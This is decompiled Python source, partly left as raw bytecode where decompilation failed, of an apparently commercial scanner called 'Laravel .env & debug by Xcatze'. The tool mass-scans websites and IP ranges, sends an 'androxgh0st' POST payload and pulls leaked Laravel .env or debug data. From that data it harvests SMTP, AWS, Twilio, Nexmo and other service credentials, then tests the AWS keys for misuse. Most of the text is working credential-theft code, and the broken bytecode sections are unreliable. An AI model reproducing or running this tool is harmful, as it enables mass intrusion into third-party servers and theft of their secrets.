            print('\x1b[1;40m#\x1b[0m Start Check ' + newurl)
            if 'APP_KEY=' in str(get_source):
                get_smtp(newurl, str(get_source))
                break
            else:
                print('\x1b[1;40m[BY XCATZE] {} |  \x1b[1;31;40mNOT VULN'.format(str(url)))
        except Exception as e:
            try:
                pass
            finally:
                e = None
                del e

    else:
        get_source = requests.post(url, data={'0x[]': 'androxgh0st'}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
        if '<td>APP_KEY</td>' in get_source:
            get_smtp2(url, get_source)
        else:
            print('\x1b[1;40m[BY XCATZE] {} |  \x1b[1;31;40mNOT VULN'.format(str(url)))


def checkset():
    AWS_ACCESS_KEYx = AWS_ACCESS_KEY()
    AWS_KEYx = AWS_KEY()
    twilliox = twillio()
    awsx = aws()
    sparkpostmailx = sparkpostmail()
    and1x = and1()
    mandrillappx = mandrillapp()
    zohox = zoho()
    sendgridx = sendgrid()
    office365x = office365()
    mailgunx = mailgun()
    NEXMOx = NEXMO()
    EXOTELx = EXOTEL()
    ONESIGNALx = ONESIGNAL()
    TOKBOXx = TOKBOX()
    print('amazonaws:' + awsx + '|twillio:' + twilliox + '|AWS_KEY:' + AWS_KEYx + '|AWS_ACCESS_KEY:' + AWS_ACCESS_KEYx + '|sparkpostmail:' + sparkpostmailx + '\n1and1:' + and1x + '|mandrillapp:' + mandrillappx + '|zoho:' + zohox + '|sendgrid:' + sendgridx + '|office365:' + office365x + '|mailgun:' + mailgunx + '\n|NEXMO:' + NEXMOx + '|EXOTEL:' + EXOTELx + '|ONESIGNAL:' + ONESIGNALx + '|TOKBOX:' + TOKBOXx)


def logo():
    clear = '\x1b[0m'
    x = u'\n\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u255a\u2588\u2588\u2557\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\n\u2591\u255a\u2588\u2588\u2588\u2554\u255d\u2591\u2588\u2588\u2551\u2591\u2591\u255a\u2550\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\u2588\u2588\u2588\u2554\u2550\u255d\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2591\n\u2591\u2588\u2588\u2554\u2588\u2588\u2557\u2591\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2554\u2550\u2550\u255d\u2591\u2591\u2588\u2588\u2554\u2550\u2550\u255d\u2591\u2591\n\u2588\u2588\u2554\u255d\u255a\u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u2591\u255a\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\n \x1b[92mTools    \x1b[1;40m: \x1b[1;33;40mLaravel .env & debug by Xcatze\n \x1b[92mTelegram \x1b[1;40m: \x1b[1;33;40mt.me/xcatze\n \x1b[92mVersion  \x1b[1;40m: \x1b[1;33;40mv3.3 (BETA)\n\n \x1b[92mFeatures:\n \x1b[1;40m- Auto Send Valid Smtp to your email\n \x1b[1;40m- Auto Crack IM USER/SES from AWS\n \x1b[1;40m- Auto Check Valid twillio (Balance, Send Status)\n \x1b[1;40m- Auto Check Valid Nexmo (Balance)\n \x1b[1;40m- Auto Reverse IP\n \x1b[1;40m- Free Tutorial Grab IP & Request feature\n  \n\x1b[92mPrice : \x1b[1;40m$100 lifetime & free update\n'
    print(x)


logo()

def menucit():
    sdx = '\n \x1b[1;37;40m[1]  Grab .env + Debug                        \x1b[1;37;40m[7]  DORK/KEYWORD + Option 2\n \x1b[1;37;40m[2]  Grab .env + Debug (Auto Scan)            \x1b[1;37;40m[8]  MASS IP RANGE SCAN + Option 2\n \x1b[1;37;40m[3]  Option 2 + Auto reverse ip               \x1b[1;37;40m[9]  MASS IP RANGE SCAN + Option 3\n \x1b[1;37;40m[4]  Option 2 + Multiple path [with path.ini] \x1b[1;37;40m[10]  Remove duplicate list\n \x1b[1;37;40m[5]  Website To IP + Option 3                 \x1b[1;37;40m[11]  Check Limit Aws Key\n \x1b[1;37;40m[6]  Website To IP Only                       \x1b[1;37;40m[12]  Crack AWS Key List Format(awskey|secretkey|region)\n '
    print(sdx)


def jembotngw(sites):
    if 'http' not in sites:
        site = 'http://' + sites
        prepare(site)
    else:
        prepare(sites)


def jembotngw2(sites):
    if 'http' not in sites:
        site = 'http://' + sites
        di_chckngntd(site)
    else:
        di_chckngntd(sites)


def prepare2(sites):
    di_chckngntd(sites)


def jembotngw4(sites):
    if 'http' not in sites:
        site = 'http://' + sites
        di_chckngntd4(site)
    else:
        di_chckngntd4(sites)


def nowayngntd():
    Targetssa = input('\x1b[1;37;40mInput Your List : ')
    ip_list = open(Targetssa, 'r').read().split('\n')
    for sites in ip_list:
        if 'http' not in sites:
            site = 'http://' + sites
            prepare(site)
        else:
            prepare(sites)


def makethread(jumlah):
    try:
        nam = input('\x1b[1;37;40mInput Your List : ')
        th = int(jumlah)
        time.sleep(3)
        liss = [i.strip() for i in open(nam, 'r').readlines()]
        zm = Pool(th)
        zm.map(jembotngw, liss)
        zm.close()
        zm.join()
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e


def makethread3(jumlah):
    try:
        nam = input('\x1b[1;37;40mInput Your List : ')
        th = int(jumlah)
        time.sleep(3)
        liss = [i.strip() for i in open(nam, 'r').readlines()]
        zm = Pool(th)
        zm.map(dorkscan, liss)
        zm.close()
        zm.join()
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e


def makethread4(jumlah):
    try:
        nam = input('\x1b[1;37;40mInput Your List : ')
        th = int(jumlah)
        time.sleep(3)
        liss = [i.strip() for i in open(nam, 'r').readlines()]
        zm = Pool(th)
        zm.map(jembotngw4, liss)
        zm.close()
        zm.join()
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e


def makethread5():
    file_location = input('\x1b[1;37;40mInput Your List : ')
    opened_file = open(file_location).readlines()
    fresh_lines_sites = [items.rstrip() for items in opened_file]
    sites_len = len(fresh_lines_sites)
    rotation = 0
    for lines in fresh_lines_sites:
        rotation += 1
        ip_grabberautoscan(lines, sites_len, rotation)


def makethread6():
    file_location = input('\x1b[1;37;40mInput Your List : ')
    opened_file = open(file_location).readlines()
    fresh_lines_sites = [items.rstrip() for items in opened_file]
    sites_len = len(fresh_lines_sites)
    rotation = 0
    for lines in fresh_lines_sites:
        ip_grabber(lines, sites_len, rotation)


def makethread8():
    ipstart = input('\x1b[1;37;40mstart ip : ')
    ip1 = ipstart.strip().split('.')
    ipto = input('\x1b[1;37;40mto ip : ')
    ip2 = ipto.strip().split('.')
    cur = ipstart.strip().split('.')
    rip0 = int(ip1[0])
    rip1 = int(ip1[1])
    rip2 = int(ip1[2])
    rip3 = int(ip1[3]) - 1
    finalip = 0
    while finalip != ipto:
        rip3 += 1
        finalip = str(rip0) + '.' + str(rip1) + '.' + str(rip2) + '.' + str(rip3)
        jembotngw2(finalip)
        if rip2 != int(ip2[2]) + 1 and rip3 == int(ip2[3]):
            rip2 += 1
            rip3 = int(ip1[3]) - 1
        elif rip1 != int(ip2[1]) and rip2 == int(ip2[2]):
            rip1 += 1
            rip2 = int(ip1[2])
            rip3 = int(ip1[3]) - 1
        elif rip0 != int(ip2[0]) and rip1 == int(ip2[1]):
            rip0 += 1
            rip1 = int(ip1[1])
            rip2 = int(ip1[2])
            rip3 = int(ip1[3]) - 1


def makethread9():
    ipstart = input('\x1b[1;37;40mstart ip : ')
    ip1 = ipstart.strip().split('.')
    ipto = input('\x1b[1;37;40mto ip : ')
    ip2 = ipto.strip().split('.')
    cur = ipstart.strip().split('.')
    rip0 = int(ip1[0])
    rip1 = int(ip1[1])
    rip2 = int(ip1[2])
    rip3 = int(ip1[3]) - 1
    finalip = 0
    while finalip != ipto:
        rip3 += 1
        finalip = str(rip0) + '.' + str(rip1) + '.' + str(rip2) + '.' + str(rip3)
        dorkscan(finalip)
        if rip2 != int(ip2[2]) + 1 and rip3 == int(ip2[3]):
            rip2 += 1
            rip3 = int(ip1[3]) - 1
        elif rip1 != int(ip2[1]) and rip2 == int(ip2[2]):
            rip1 += 1
            rip2 = int(ip1[2])
            rip3 = int(ip1[3]) - 1
        elif rip0 != int(ip2[0]) and rip1 == int(ip2[1]):
            rip0 += 1
            rip1 = int(ip1[1])
            rip2 = int(ip1[2])
            rip3 = int(ip1[3]) - 1


def nowayngntd2():
    Targetssa = input('\x1b[1;37;40mInput Your List : ')
    ip_list = open(Targetssa, 'r').read().split('\n')
    for sites in ip_list:
        if 'http' not in sites:
            site = 'http://' + sites
            prepare2(site)
        else:
            prepare2(sites)


def makethread2(jumlah):
    try:
        nam = input('\x1b[1;37;40mInput Your List : ')
        th = int(jumlah)
        time.sleep(3)
        liss = [i.strip() for i in open(nam, 'r').readlines()]
        zm = Pool(th)
        zm.map(jembotngw2, liss)
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e


def cracksespisah--- This code section failed: ---

 L.2164         0  LOAD_GLOBAL              input
                2  LOAD_STR                 '\x1b[1;37;40mInput AWS KEY List : '
                4  CALL_FUNCTION_1       1  ''
                6  STORE_FAST               'nam'

 L.2165         8  LOAD_GLOBAL              open
               10  LOAD_FAST                'nam'
               12  LOAD_STR                 'r'
               14  CALL_FUNCTION_2       2  ''
               16  LOAD_METHOD              read
               18  CALL_METHOD_0         0  ''
               20  LOAD_METHOD              split
               22  LOAD_STR                 '\n'
               24  CALL_METHOD_1         1  ''
               26  STORE_FAST               'lista'

 L.2166        28  LOAD_GLOBAL              len
               30  LOAD_FAST                'lista'
               32  CALL_FUNCTION_1       1  ''
               34  STORE_FAST               'totalnum'

 L.2167        36  LOAD_GLOBAL              print
               38  LOAD_STR                 '[X] Threads Number  : '
               40  LOAD_STR                 ''
               42  LOAD_CONST               ('end',)
               44  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               46  POP_TOP          

 L.2169        48  LOAD_GLOBAL              int
               50  LOAD_GLOBAL              input
               52  CALL_FUNCTION_0       0  ''
               54  CALL_FUNCTION_1       1  ''
               56  STORE_FAST               'threadnum'

 L.2171        58  BUILD_LIST_0          0 
               60  STORE_FAST               'threads'

 L.2173        62  LOAD_FAST                'lista'
               64  GET_ITER         
               66  FOR_ITER            194  'to 194'
               68  STORE_FAST               'i'

 L.2174        70  SETUP_FINALLY       176  'to 176'

 L.2175        72  LOAD_FAST                'i'
               74  LOAD_METHOD              split
               76  LOAD_STR                 '|'
               78  CALL_METHOD_1         1  ''
               80  UNPACK_SEQUENCE_3     3 
               82  STORE_FAST               'ACCESS_KEY'
               84  STORE_FAST               'SECRET_KEY'
               86  STORE_FAST               'REGION'

 L.2176        88  LOAD_GLOBAL              threading
               90  LOAD_ATTR                Thread
               92  LOAD_GLOBAL              autocreate
               94  LOAD_FAST                'ACCESS_KEY'
               96  LOAD_METHOD              strip
               98  CALL_METHOD_0         0  ''
              100  LOAD_FAST                'SECRET_KEY'
              102  LOAD_METHOD              strip
              104  CALL_METHOD_0         0  ''
              106  LOAD_FAST                'REGION'
              108  LOAD_METHOD              strip
              110  CALL_METHOD_0         0  ''
              112  BUILD_TUPLE_3         3 
              114  LOAD_CONST               ('target', 'args')
              116  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              118  STORE_FAST               'thread'

 L.2177       120  LOAD_FAST                'threads'
              122  LOAD_METHOD              append
              124  LOAD_FAST                'thread'
              126  CALL_METHOD_1         1  ''
              128  POP_TOP          

 L.2178       130  LOAD_FAST                'thread'
              132  LOAD_METHOD              start
              134  CALL_METHOD_0         0  ''
              136  POP_TOP          

 L.2179       138  LOAD_GLOBAL              len
              140  LOAD_FAST                'threads'
              142  CALL_FUNCTION_1       1  ''
              144  LOAD_FAST                'threadnum'
              146  COMPARE_OP               ==
              148  POP_JUMP_IF_FALSE   172  'to 172'

 L.2180       150  LOAD_FAST                'threads'
              152  GET_ITER         
              154  FOR_ITER            172  'to 172'
              156  STORE_FAST               'i'

 L.2181       158  LOAD_FAST                'i'
              160  LOAD_METHOD              join
              162  CALL_METHOD_0         0  ''
              164  POP_TOP          

 L.2182       166  BUILD_LIST_0          0 
              168  STORE_FAST               'threads'
              170  JUMP_BACK           154  'to 154'
            172_0  COME_FROM           148  '148'
              172  POP_BLOCK        
              174  JUMP_BACK            66  'to 66'
            176_0  COME_FROM_FINALLY    70  '70'

 L.2183       176  POP_TOP          
              178  POP_TOP          
              180  POP_TOP          

 L.2184       182  POP_EXCEPT       
              184  JUMP_BACK            66  'to 66'
              186  POP_EXCEPT       
              188  JUMP_BACK            66  'to 66'
              190  END_FINALLY      
              192  JUMP_BACK            66  'to 66'

Parse error at or near `POP_EXCEPT' instruction at offset 186


def cinxx--- This code section failed: ---

 L.2187       0_2  SETUP_FINALLY       448  'to 448'

 L.2188         4  LOAD_GLOBAL              menucit
                6  CALL_FUNCTION_0       0  ''
                8  POP_TOP          

 L.2189        10  LOAD_GLOBAL              input
               12  LOAD_STR                 '\x1b[1;37;40mChoice : '
               14  CALL_FUNCTION_1       1  ''
               16  STORE_FAST               'Targetssad'

 L.2190        18  LOAD_FAST                'Targetssad'
               20  LOAD_STR                 '1'
               22  COMPARE_OP               ==
               24  POP_JUMP_IF_FALSE    70  'to 70'

 L.2192        26  LOAD_GLOBAL              input
               28  LOAD_STR                 '\x1b[1;37;40mWith thread or no [y/n] : '
               30  CALL_FUNCTION_1       1  ''
               32  STORE_FAST               'Targetssas'

 L.2193        34  LOAD_FAST                'Targetssas'
               36  LOAD_STR                 'y'
               38  COMPARE_OP               ==
               40  POP_JUMP_IF_FALSE    60  'to 60'

 L.2194        42  LOAD_GLOBAL              input
               44  LOAD_STR                 '\x1b[1;37;40mThread : '
               46  CALL_FUNCTION_1       1  ''
               48  STORE_FAST               'jumlahkn'

 L.2195        50  LOAD_GLOBAL              makethread
               52  LOAD_FAST                'jumlahkn'
               54  CALL_FUNCTION_1       1  ''
               56  POP_TOP          
               58  JUMP_FORWARD        444  'to 444'
             60_0  COME_FROM            40  '40'

 L.2197        60  LOAD_GLOBAL              nowayngntd
               62  CALL_FUNCTION_0       0  ''
               64  POP_TOP          
            66_68  JUMP_FORWARD        444  'to 444'
             70_0  COME_FROM            24  '24'

 L.2198        70  LOAD_FAST                'Targetssad'
               72  LOAD_STR                 '3'
               74  COMPARE_OP               ==
               76  POP_JUMP_IF_FALSE   124  'to 124'

 L.2199        78  LOAD_GLOBAL              input
               80  LOAD_STR                 '\x1b[1;37;40mWith thread or no [y/n] : '
               82  CALL_FUNCTION_1       1  ''
               84  STORE_FAST               'Targetssas'

 L.2200        86  LOAD_FAST                'Targetssas'
               88  LOAD_STR                 'y'
               90  COMPARE_OP               ==
               92  POP_JUMP_IF_FALSE   112  'to 112'

 L.2201        94  LOAD_GLOBAL              input
               96  LOAD_STR                 '\x1b[1;37;40mThread : '
               98  CALL_FUNCTION_1       1  ''
              100  STORE_FAST               'jumlahkn'

 L.2202       102  LOAD_GLOBAL              makethread3
              104  LOAD_FAST                'jumlahkn'
              106  CALL_FUNCTION_1       1  ''
              108  POP_TOP          
              110  JUMP_FORWARD        444  'to 444'
            112_0  COME_FROM            92  '92'

 L.2204       112  LOAD_GLOBAL              makethread3
              114  LOAD_CONST               1
              116  CALL_FUNCTION_1       1  ''
              118  POP_TOP          
          120_122  JUMP_FORWARD        444  'to 444'
            124_0  COME_FROM            76  '76'

 L.2205       124  LOAD_FAST                'Targetssad'
              126  LOAD_STR                 '4'
              128  COMPARE_OP               ==
              130  POP_JUMP_IF_FALSE   178  'to 178'

 L.2206       132  LOAD_GLOBAL              input
              134  LOAD_STR                 '\x1b[1;37;40mWith thread or no [y/n] : '
              136  CALL_FUNCTION_1       1  ''
              138  STORE_FAST               'Targetssas'

 L.2207       140  LOAD_FAST                'Targetssas'
              142  LOAD_STR                 'y'
              144  COMPARE_OP               ==
              146  POP_JUMP_IF_FALSE   166  'to 166'

 L.2208       148  LOAD_GLOBAL              input
              150  LOAD_STR                 '\x1b[1;37;40mThread : '
              152  CALL_FUNCTION_1       1  ''
              154  STORE_FAST               'jumlahkn'

 L.2209       156  LOAD_GLOBAL              makethread4
              158  LOAD_FAST                'jumlahkn'
              160  CALL_FUNCTION_1       1  ''
              162  POP_TOP          
              164  JUMP_FORWARD        444  'to 444'
            166_0  COME_FROM           146  '146'

 L.2211       166  LOAD_GLOBAL              makethread4
              168  LOAD_CONST               1
              170  CALL_FUNCTION_1       1  ''
              172  POP_TOP          
          174_176  JUMP_FORWARD        444  'to 444'
            178_0  COME_FROM           130  '130'

 L.2212       178  LOAD_FAST                'Targetssad'
              180  LOAD_STR                 '5'
              182  COMPARE_OP               ==
              184  POP_JUMP_IF_FALSE   194  'to 194'

 L.2213       186  LOAD_GLOBAL              makethread5
              188  CALL_FUNCTION_0       0  ''
              190  POP_TOP          
              192  JUMP_FORWARD        444  'to 444'
            194_0  COME_FROM           184  '184'

 L.2215       194  LOAD_FAST                'Targetssad'
              196  LOAD_STR                 '6'
              198  COMPARE_OP               ==
              200  POP_JUMP_IF_FALSE   210  'to 210'

 L.2216       202  LOAD_GLOBAL              makethread6
              204  CALL_FUNCTION_0       0  ''
              206  POP_TOP          
              208  JUMP_FORWARD        444  'to 444'
            210_0  COME_FROM           200  '200'

 L.2217       210  LOAD_FAST                'Targetssad'
              212  LOAD_STR                 '7'
              214  COMPARE_OP               ==
              216  POP_JUMP_IF_FALSE   226  'to 226'

 L.2218       218  LOAD_GLOBAL              autodork
              220  CALL_FUNCTION_0       0  ''
              222  POP_TOP          
              224  JUMP_FORWARD        444  'to 444'
            226_0  COME_FROM           216  '216'

 L.2219       226  LOAD_FAST                'Targetssad'
              228  LOAD_STR                 '8'
              230  COMPARE_OP               ==
              232  POP_JUMP_IF_FALSE   242  'to 242'

 L.2220       234  LOAD_GLOBAL              makethread8
              236  CALL_FUNCTION_0       0  ''
              238  POP_TOP          
              240  JUMP_FORWARD        444  'to 444'
            242_0  COME_FROM           232  '232'

 L.2221       242  LOAD_FAST                'Targetssad'
              244  LOAD_STR                 '9'
              246  COMPARE_OP               ==
          248_250  POP_JUMP_IF_FALSE   260  'to 260'

 L.2222       252  LOAD_GLOBAL              makethread9
              254  CALL_FUNCTION_0       0  ''
              256  POP_TOP          
              258  JUMP_FORWARD        444  'to 444'
            260_0  COME_FROM           248  '248'

 L.2223       260  LOAD_FAST                'Targetssad'
              262  LOAD_STR                 '10'
              264  COMPARE_OP               ==
          266_268  POP_JUMP_IF_FALSE   278  'to 278'

 L.2224       270  LOAD_GLOBAL              clean
              272  CALL_FUNCTION_0       0  ''
              274  POP_TOP          
              276  JUMP_FORWARD        444  'to 444'
            278_0  COME_FROM           266  '266'

 L.2225       278  LOAD_FAST                'Targetssad'
              280  LOAD_STR                 '11'
              282  COMPARE_OP               ==
          284_286  POP_JUMP_IF_FALSE   326  'to 326'

 L.2226       288  LOAD_GLOBAL              input
              290  LOAD_STR                 'AWS KEY : '
              292  CALL_FUNCTION_1       1  ''
              294  STORE_FAST               'awskey'

 L.2227       296  LOAD_GLOBAL              input
              298  LOAD_STR                 'SECRET KEY : '
              300  CALL_FUNCTION_1       1  ''
              302  STORE_FAST               'seckey'

 L.2228       304  LOAD_GLOBAL              input
              306  LOAD_STR                 'REGION : '
              308  CALL_FUNCTION_1       1  ''
              310  STORE_FAST               'reg'

 L.2229       312  LOAD_GLOBAL              awslimitcheck
              314  LOAD_FAST                'awskey'
              316  LOAD_FAST                'seckey'
              318  LOAD_FAST                'reg'
              320  CALL_FUNCTION_3       3  ''
              322  POP_TOP          
              324  JUMP_FORWARD        444  'to 444'
            326_0  COME_FROM           284  '284'

 L.2230       326  LOAD_FAST                'Targetssad'
              328  LOAD_STR                 '12'
              330  COMPARE_OP               ==
          332_334  POP_JUMP_IF_FALSE   344  'to 344'

 L.2231       336  LOAD_GLOBAL              cracksespisah
              338  CALL_FUNCTION_0       0  ''
              340  POP_TOP          
              342  JUMP_FORWARD        444  'to 444'
            344_0  COME_FROM           332  '332'

 L.2232       344  LOAD_FAST                'Targetssad'
              346  LOAD_STR                 '2'
              348  COMPARE_OP               ==
          350_352  POP_JUMP_IF_FALSE   398  'to 398'

 L.2233       354  LOAD_GLOBAL              input
              356  LOAD_STR                 '\x1b[1;37;40mWith thread or no [y/n] : '
              358  CALL_FUNCTION_1       1  ''
              360  STORE_FAST               'Targetssas'

 L.2234       362  LOAD_FAST                'Targetssas'
              364  LOAD_STR                 'y'
              366  COMPARE_OP               ==
          368_370  POP_JUMP_IF_FALSE   390  'to 390'

 L.2235       372  LOAD_GLOBAL              input
              374  LOAD_STR                 '\x1b[1;37;40mThread : '
              376  CALL_FUNCTION_1       1  ''
              378  STORE_FAST               'jumlahkn'

 L.2236       380  LOAD_GLOBAL              makethread2
              382  LOAD_FAST                'jumlahkn'
              384  CALL_FUNCTION_1       1  ''
              386  POP_TOP          
              388  JUMP_FORWARD        396  'to 396'
            390_0  COME_FROM           368  '368'

 L.2238       390  LOAD_GLOBAL              nowayngntd2
              392  CALL_FUNCTION_0       0  ''
              394  POP_TOP          
            396_0  COME_FROM           388  '388'
              396  JUMP_FORWARD        444  'to 444'
            398_0  COME_FROM           350  '350'

 L.2240       398  LOAD_GLOBAL              os
              400  LOAD_ATTR                name
              402  LOAD_STR                 'nt'
              404  COMPARE_OP               ==
          406_408  POP_JUMP_IF_FALSE   422  'to 422'

 L.2241       410  LOAD_GLOBAL              os
              412  LOAD_METHOD              system
              414  LOAD_STR                 'cls'
              416  CALL_METHOD_1         1  ''
              418  POP_TOP          
              420  JUMP_FORWARD        432  'to 432'
            422_0  COME_FROM           406  '406'

 L.2243       422  LOAD_GLOBAL              os
              424  LOAD_METHOD              system
              426  LOAD_STR                 'clear'
              428  CALL_METHOD_1         1  ''
              430  POP_TOP          
            432_0  COME_FROM           420  '420'
            432_1  COME_FROM           164  '164'
            432_2  COME_FROM           110  '110'

 L.2244       432  LOAD_GLOBAL              logo
            434_0  COME_FROM            58  '58'
              434  CALL_FUNCTION_0       0  ''
              436  POP_TOP          

 L.2245       438  LOAD_GLOBAL              cinxx
              440  CALL_FUNCTION_0       0  ''
              442  POP_TOP          
            444_0  COME_FROM           396  '396'
            444_1  COME_FROM           342  '342'
            444_2  COME_FROM           324  '324'
            444_3  COME_FROM           276  '276'
            444_4  COME_FROM           258  '258'
            444_5  COME_FROM           240  '240'
            444_6  COME_FROM           224  '224'
            444_7  COME_FROM           208  '208'
            444_8  COME_FROM           192  '192'
            444_9  COME_FROM           174  '174'
           444_10  COME_FROM           120  '120'
           444_11  COME_FROM            66  '66'
              444  POP_BLOCK        
              446  JUMP_FORWARD        500  'to 500'
            448_0  COME_FROM_FINALLY     0  '0'

 L.2247       448  DUP_TOP          
              450  LOAD_GLOBAL              KeyboardInterrupt
              452  COMPARE_OP               exception-match
          454_456  POP_JUMP_IF_FALSE   498  'to 498'
              458  POP_TOP          
              460  STORE_FAST               'e'
              462  POP_TOP          
              464  SETUP_FINALLY       486  'to 486'

 L.2248       466  LOAD_GLOBAL              print
              468  LOAD_STR                 'Exit Program'
              470  CALL_FUNCTION_1       1  ''
              472  POP_TOP          

 L.2249       474  LOAD_GLOBAL              sys
              476  LOAD_METHOD              exit
              478  CALL_METHOD_0         0  ''
              480  POP_TOP          
              482  POP_BLOCK        
              484  BEGIN_FINALLY    
            486_0  COME_FROM_FINALLY   464  '464'
              486  LOAD_CONST               None
              488  STORE_FAST               'e'
              490  DELETE_FAST              'e'
              492  END_FINALLY      
              494  POP_EXCEPT       
              496  JUMP_FORWARD        500  'to 500'
            498_0  COME_FROM           454  '454'
              498  END_FINALLY      
            500_0  COME_FROM           496  '496'
            500_1  COME_FROM           446  '446'

Parse error at or near `COME_FROM' instruction at offset 434_0


cinxx()
